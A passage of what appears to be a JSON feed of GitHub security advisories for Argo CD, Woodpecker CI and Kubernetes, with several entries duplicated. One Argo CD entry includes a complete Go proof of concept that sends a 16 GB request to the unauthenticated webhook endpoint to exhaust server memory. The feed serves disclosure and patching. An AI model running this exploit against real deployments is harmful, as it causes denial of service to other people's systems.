id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.11.6\nv2.10.15\nv2.9.20</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was found &amp; reported by Jakub Ciolek</p>\n<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc\">https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36\">https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df\">https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-40634\">https://nvd.nist.gov/vuln/detail/CVE-2024-40634</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jmvp-698c-4x3w\">https://github.com/advisories/GHSA-jmvp-698c-4x3w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jmvp-698c-4x3w",
            "title": "[github.com/argoproj/argo-cd/v2] Argo CD Unauthenticated Denial of Service (DoS) Vulnerability via /api/webhook Endpoint",
            "date_modified": "2024-07-22T19:58:30.000Z",
            "date_published": "2024-07-22T17:20:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jmvp-698c-4x3w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This report details a security vulnerability in Argo CD, where an unauthenticated attacker can send a specially crafted large JSON payload to the /api/webhook endpoint, causing excessive memory allocation that leads to service disruption by triggering an Out Of Memory (OOM) kill. The issue poses a high risk to the availability of Argo CD deployments.</p>\n<h3 id=\"details\">Details</h3>\n<p>The webhook server always listens to requests. By default, the endpoint doesn't require authentication. It's possible to send a large, malicious request with headers (in this case \"X-GitHub-Event: push\") that will make ArgoCD start allocating memory to parse the incoming request. Since the request can be constructed client-side without allocating large amounts of memory, it can be arbitrarily large. Eventually, the argocd-server component will get OOMKilled as it consumes all its available memory.</p>\n<p>The fix would be to enforce a limit on the size of the request being parsed.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Port-forward to the argocd-server service, like so:</p>\n<pre><code class=\"language-console\">kubectl port-forward svc/argocd-server -n argocd 8080:443\n</code></pre>\n<p>Run the below code:</p>\n<pre><code class=\"language-go\">package main\n\nimport (\n    \"crypto/tls\"\n    \"io\"\n    \"net/http\"\n)\n\n// Define a custom io.Reader that generates a large dummy JSON payload.\ntype DummyJSONReader struct {\n    size int64 // Total size to generate\n    read int64 // Bytes already generated\n}\n\n// Read generates the next chunk of the dummy JSON payload.\nfunc (r *DummyJSONReader) Read(p []byte) (n int, err error) {\n    if r.read &gt;= r.size {\n        return 0, io.EOF // Finished generating\n    }\n\n    start := false\n    if r.read == 0 {\n        // Start of JSON\n        p[0] = '{'\n        p[1] = '\"'\n        p[2] = 'd'\n        p[3] = 'a'\n        p[4] = 't'\n        p[5] = 'a'\n        p[6] = '\"'\n        p[7] = ':'\n        p[8] = '\"'\n        n = 9\n        start = true\n    }\n\n    for i := n; i &lt; len(p); i++ {\n        if r.read+int64(i)-int64(n)+1 == r.size-1 {\n            // End of JSON\n            p[i] = '\"'\n            p[i+1] = '}'\n            r.read += int64(i) + 2 - int64(n)\n            return i + 2 - n, nil\n        } else {\n            p[i] = 'x' // Dummy data\n        }\n    }\n\n    r.read += int64(len(p)) - int64(n)\n    if start {\n        return len(p), nil\n    }\n    return len(p) - n, nil\n}\n\nfunc main() {\n    // Initialize the custom reader with the desired size (16GB in this case).\n    payloadSize := int64(16) * 1024 * 1024 * 1024 // 16GB\n    reader := &amp;DummyJSONReader{size: payloadSize}\n\n    // HTTP client setup\n    httpClient := &amp;http.Client{\n        Timeout: 0, // No timeout\n        Transport: &amp;http.Transport{\n            TLSClientConfig: &amp;tls.Config{InsecureSkipVerify: true},\n        },\n    }\n\n    req, err := http.NewRequest(\"POST\", \"https://localhost:8080/api/webhook\", reader)\n    if err != nil {\n        panic(err)\n    }\n\n    // Set headers\n    req.Header.Set(\"Content-Type\", \"application/json\")\n    req.Header.Set(\"X-GitHub-Event\", \"push\")\n\n    resp, err := httpClient.Do(req)\n    if err != nil {\n        panic(err)\n    }\n    defer resp.Body.Close()\n\n    println(\"Response status code:\", resp.StatusCode)\n}\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.11.6\nv2.10.15\nv2.9.20</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a>\nJoin us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was found &amp; reported by Jakub Ciolek</p>\n<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-jmvp-698c-4x3w</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc\">https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36\">https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df\">https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-40634\">https://nvd.nist.gov/vuln/detail/CVE-2024-40634</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jmvp-698c-4x3w\">https://github.com/advisories/GHSA-jmvp-698c-4x3w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jmvp-698c-4x3w",
            "title": "[github.com/argoproj/argo-cd] Argo CD Unauthenticated Denial of Service (DoS) Vulnerability via /api/webhook Endpoint",
            "date_modified": "2024-07-22T19:58:30.000Z",
            "date_published": "2024-07-22T17:20:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jmvp-698c-4x3w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The server allow to create any user who can trigger a pipeline run malicious workflows:</p>\n<ul>\n<li>Those workflows can either lead to a host takeover that runs the agent executing the workflow.</li>\n<li>Or allow to extract the secrets who would be normally provided to the plugins who's entrypoint are overwritten.</li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<p><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3933\">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em>\n<strong>Enable the \"gated\" repo feature and review each change upfront</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3933\">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/pull/11\">https://github.com/woodpecker-ci/woodpecker-security/pull/11</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/issues/8\">https://github.com/woodpecker-ci/woodpecker-security/issues/8</a> (info will be published later at <a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3924\">https://github.com/woodpecker-ci/woodpecker/issues/3924</a>)</li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/issues/9\">https://github.com/woodpecker-ci/woodpecker-security/issues/9</a> (info will be published later at <a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3924\">https://github.com/woodpecker-ci/woodpecker/issues/3924</a>)</li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3924\">https://github.com/woodpecker-ci/woodpecker/issues/3924</a> (info will be published later once we got adoption of the update)</li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<ul>\n<li>Daniel Kilimnik <a href=\"https://x.com/D_K_Dev\">@D_K_Dev</a> (Neodyme AG)</li>\n<li>Felipe Custodio Romero <a href=\"https://x.com/_localo_\">@<em>localo</em></a> (Neodyme AG)</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-xw35-rrcp-g7xm\">https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-xw35-rrcp-g7xm</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3924\">https://github.com/woodpecker-ci/woodpecker/issues/3924</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3933\">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/commit/764329ed1dbc47c4a517ccc749e3feb34059fac8\">https://github.com/woodpecker-ci/woodpecker/commit/764329ed1dbc47c4a517ccc749e3feb34059fac8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41121\">https://nvd.nist.gov/vuln/detail/CVE-2024-41121</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/issues/8\">https://github.com/woodpecker-ci/woodpecker-security/issues/8</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/issues/9\">https://github.com/woodpecker-ci/woodpecker-security/issues/9</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/pull/11\">https://github.com/woodpecker-ci/woodpecker-security/pull/11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xw35-rrcp-g7xm\">https://github.com/advisories/GHSA-xw35-rrcp-g7xm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xw35-rrcp-g7xm",
            "title": "[go.woodpecker-ci.org/woodpecker] Woodpecker's custom workspace allow to overwrite plugin entrypoint executable",
            "date_modified": "2024-07-22T13:18:37.000Z",
            "date_published": "2024-07-19T19:59:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xw35-rrcp-g7xm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The server allow to create any user who can trigger a pipeline run malicious workflows:</p>\n<ul>\n<li>Those workflows can either lead to a host takeover that runs the agent executing the workflow.</li>\n<li>Or allow to extract the secrets who would be normally provided to the plugins who's entrypoint are overwritten.</li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<p><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3933\">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em>\n<strong>Enable the \"gated\" repo feature and review each change upfront</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3933\">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/pull/11\">https://github.com/woodpecker-ci/woodpecker-security/pull/11</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/issues/8\">https://github.com/woodpecker-ci/woodpecker-security/issues/8</a> (info will be published later at <a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3924\">https://github.com/woodpecker-ci/woodpecker/issues/3924</a>)</li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/issues/9\">https://github.com/woodpecker-ci/woodpecker-security/issues/9</a> (info will be published later at <a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3924\">https://github.com/woodpecker-ci/woodpecker/issues/3924</a>)</li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3924\">https://github.com/woodpecker-ci/woodpecker/issues/3924</a> (info will be published later once we got adoption of the update)</li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<ul>\n<li>Daniel Kilimnik <a href=\"https://x.com/D_K_Dev\">@D_K_Dev</a> (Neodyme AG)</li>\n<li>Felipe Custodio Romero <a href=\"https://x.com/_localo_\">@<em>localo</em></a> (Neodyme AG)</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-xw35-rrcp-g7xm\">https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-xw35-rrcp-g7xm</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3924\">https://github.com/woodpecker-ci/woodpecker/issues/3924</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3933\">https://github.com/woodpecker-ci/woodpecker/pull/3933</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/commit/764329ed1dbc47c4a517ccc749e3feb34059fac8\">https://github.com/woodpecker-ci/woodpecker/commit/764329ed1dbc47c4a517ccc749e3feb34059fac8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41121\">https://nvd.nist.gov/vuln/detail/CVE-2024-41121</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/issues/8\">https://github.com/woodpecker-ci/woodpecker-security/issues/8</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/issues/9\">https://github.com/woodpecker-ci/woodpecker-security/issues/9</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/pull/11\">https://github.com/woodpecker-ci/woodpecker-security/pull/11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xw35-rrcp-g7xm\">https://github.com/advisories/GHSA-xw35-rrcp-g7xm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xw35-rrcp-g7xm",
            "title": "[go.woodpecker-ci.org/woodpecker/v2] Woodpecker's custom workspace allow to overwrite plugin entrypoint executable",
            "date_modified": "2024-07-22T13:18:37.000Z",
            "date_published": "2024-07-19T19:59:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xw35-rrcp-g7xm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The server allow to create any user who can trigger a pipeline run malicious workflows:</p>\n<ul>\n<li>Those workflows can either lead to a host takeover that runs the agent executing the workflow.</li>\n<li>Or allow to extract the secrets who would be normally provided to the plugins who's entrypoint are overwritten.</li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<p><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3909\">https://github.com/woodpecker-ci/woodpecker/pull/3909</a>\n<a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3934\">https://github.com/woodpecker-ci/woodpecker/pull/3934</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em>\n<strong>Enable the \"gated\" repo feature and review each change upfront of running</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3909\">https://github.com/woodpecker-ci/woodpecker/pull/3909</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3934\">https://github.com/woodpecker-ci/woodpecker/pull/3934</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/issues/10\">https://github.com/woodpecker-ci/woodpecker-security/issues/10</a> (info will be published later at <a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3929\">https://github.com/woodpecker-ci/woodpecker/issues/3929</a>)</li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3929\">https://github.com/woodpecker-ci/woodpecker/issues/3929</a> (info will be published later once we got adoption of the update)</li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<ul>\n<li>Daniel Kilimnik <a href=\"https://x.com/D_K_Dev\">@D_K_Dev</a> (Neodyme AG)</li>\n<li>Felipe Custodio Romero <a href=\"https://x.com/_localo_\">@<em>localo</em></a> (Neodyme AG)</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-3wf2-2pq4-4rvc\">https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-3wf2-2pq4-4rvc</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3929\">https://github.com/woodpecker-ci/woodpecker/issues/3929</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3909\">https://github.com/woodpecker-ci/woodpecker/pull/3909</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3934\">https://github.com/woodpecker-ci/woodpecker/pull/3934</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/commit/8aa3e5ec82c92eca3279e4be68625111eeedf1c4\">https://github.com/woodpecker-ci/woodpecker/commit/8aa3e5ec82c92eca3279e4be68625111eeedf1c4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41122\">https://nvd.nist.gov/vuln/detail/CVE-2024-41122</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/issues/10\">https://github.com/woodpecker-ci/woodpecker-security/issues/10</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3wf2-2pq4-4rvc\">https://github.com/advisories/GHSA-3wf2-2pq4-4rvc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3wf2-2pq4-4rvc",
            "title": "[go.woodpecker-ci.org/woodpecker] Woodpecker's custom environment variables allow to alter execution flow of plugins",
            "date_modified": "2024-07-22T13:17:48.000Z",
            "date_published": "2024-07-19T19:59:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3wf2-2pq4-4rvc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The server allow to create any user who can trigger a pipeline run malicious workflows:</p>\n<ul>\n<li>Those workflows can either lead to a host takeover that runs the agent executing the workflow.</li>\n<li>Or allow to extract the secrets who would be normally provided to the plugins who's entrypoint are overwritten.</li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<p><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3909\">https://github.com/woodpecker-ci/woodpecker/pull/3909</a>\n<a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3934\">https://github.com/woodpecker-ci/woodpecker/pull/3934</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em>\n<strong>Enable the \"gated\" repo feature and review each change upfront of running</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3909\">https://github.com/woodpecker-ci/woodpecker/pull/3909</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3934\">https://github.com/woodpecker-ci/woodpecker/pull/3934</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/issues/10\">https://github.com/woodpecker-ci/woodpecker-security/issues/10</a> (info will be published later at <a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3929\">https://github.com/woodpecker-ci/woodpecker/issues/3929</a>)</li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3929\">https://github.com/woodpecker-ci/woodpecker/issues/3929</a> (info will be published later once we got adoption of the update)</li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<ul>\n<li>Daniel Kilimnik <a href=\"https://x.com/D_K_Dev\">@D_K_Dev</a> (Neodyme AG)</li>\n<li>Felipe Custodio Romero <a href=\"https://x.com/_localo_\">@<em>localo</em></a> (Neodyme AG)</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-3wf2-2pq4-4rvc\">https://github.com/woodpecker-ci/woodpecker/security/advisories/GHSA-3wf2-2pq4-4rvc</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/issues/3929\">https://github.com/woodpecker-ci/woodpecker/issues/3929</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3909\">https://github.com/woodpecker-ci/woodpecker/pull/3909</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/pull/3934\">https://github.com/woodpecker-ci/woodpecker/pull/3934</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker/commit/8aa3e5ec82c92eca3279e4be68625111eeedf1c4\">https://github.com/woodpecker-ci/woodpecker/commit/8aa3e5ec82c92eca3279e4be68625111eeedf1c4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41122\">https://nvd.nist.gov/vuln/detail/CVE-2024-41122</a></li>\n<li><a href=\"https://github.com/woodpecker-ci/woodpecker-security/issues/10\">https://github.com/woodpecker-ci/woodpecker-security/issues/10</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3wf2-2pq4-4rvc\">https://github.com/advisories/GHSA-3wf2-2pq4-4rvc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3wf2-2pq4-4rvc",
            "title": "[go.woodpecker-ci.org/woodpecker/v2] Woodpecker's custom environment variables allow to alter execution flow of plugins",
            "date_modified": "2024-07-22T13:17:48.000Z",
            "date_published": "2024-07-19T19:59:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3wf2-2pq4-4rvc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A security issue was discovered in Kubernetes clusters with Windows nodes where BUILTIN\\Users&nbsp;may be able to read container logs and NT AUTHORITY\\Authenticated Users&nbsp;may be able to modify container logs.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-5321\">https://nvd.nist.gov/vuln/detail/CVE-2024-5321</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/126161\">https://github.com/kubernetes/kubernetes/issues/126161</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0\">https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa\">https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a\">https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190\">https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1\">https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-82m2-cv7p-4m75\">https://github.com/advisories/GHSA-82m2-cv7p-4m75</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-82m2-cv7p-4m75",
            "title": "[k8s.io/kubernetes] Kubernetes sets incorrect permissions on Windows containers logs",
            "date_modified": "2024-07-18T21:58:16.000Z",
            "date_published": "2024-07-18T21:30:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-82m2-cv7p-4m75"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A security issue was discovered in Kubernetes clusters with Windows nodes where BUILTIN\\Users&nbsp;may be able to read container logs and NT AUTHORITY\\Authenticated Users&nbsp;may be able to modify container logs.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-5321\">https://nvd.nist.gov/vuln/detail/CVE-2024-5321</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/126161\">https://github.com/kubernetes/kubernetes/issues/126161</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0\">https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa\">https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a\">https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190\">https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1\">https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-82m2-cv7p-4m75\">https://github.com/advisories/GHSA-82m2-cv7p-4m75</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-82m2-cv7p-4m75",
            "title": "[k8s.io/kubernetes] Kubernetes sets incorrect permissions on Windows containers logs",
            "date_modified": "2024-07-18T21:58:16.000Z",
            "date_published": "2024-07-18T21:30:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-82m2-cv7p-4m75"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A security issue was discovered in Kubernetes clusters with Windows nodes where BUILTIN\\Users&nbsp;may be able to read container logs and NT AUTHORITY\\Authenticated Users&nbsp;may be able to modify container logs.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-5321\">https://nvd.nist.gov/vuln/detail/CVE-2024-5321</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/126161\">https://github.com/kubernetes/kubernetes/issues/126161</a></li>\n<li><a href=\"https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0\">https://groups.google.com/g/kubernetes-security-announce/c/81c0BHkKNt0</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa\">https://github.com/kubernetes/kubernetes/commit/23660a78ae462a6c8c75ac7ffd9af97550dda1aa</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a\">https://github.com/kubernetes/kubernetes/commit/84beb2915fa28ae477fe0676be8ba94ccd2b811a</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190\">https://github.com/kubernetes/kubernetes/commit/90589b8f63d28bcd3db89749950ebc48ed07c190</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1\">https://github.com/kubernetes/kubernetes/commit/de2033033b1d202ecaaa79d41861a075df8b49c1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-82m2-cv7p-4m75\">https://github.com/advisories/GHSA-82m2-cv7p-4m75</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-82m2-cv7p-4m75",
            "title": "[k8s.io/kubernetes] Kubernetes sets incorrect permissions on Windows containers logs",
            "date_modified": "2024-07-18T21:58:16.000Z",
            "date_published": "2024-07-18T21:30:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-82m2-cv7p-4m75"
            },
            "tags": [
                "severity"
            ]
        },
        {
